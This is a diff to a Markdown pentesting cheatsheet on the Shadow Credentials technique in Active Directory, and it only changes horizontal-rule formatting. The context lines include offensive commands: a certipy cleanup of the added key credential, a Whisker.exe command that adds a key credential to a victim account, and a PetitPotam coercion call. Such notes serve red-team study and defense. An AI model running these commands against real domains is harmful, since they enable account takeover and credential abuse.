@@ -25,7 +25,7 @@ linked:
 ---
 # Shadow Credentials
 
-***
+---
 
 ## Cheatsheet
 ^shadow-credentials
@@ -39,7 +39,7 @@ linked:
 | **Cleanup** | `certipy shadow clear -u atk -p pass -account VICTIM$ -dc-ip DC` | Borrar KCL agregado |
 | **Whisker (Windows)** | `.\Whisker.exe add /target:VICTIM$` | On-host Windows |
 
-***
+---
 
 ## Concepto
 
@@ -185,4 +185,4 @@ PetitPotam.py -u '' -p '' ATTACKER VICTIM
 - [Whisker](https://github.com/eladshamir/Whisker)
 - [Elad Shamir - Shadow Credentials paper](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec)
 
-***
+---
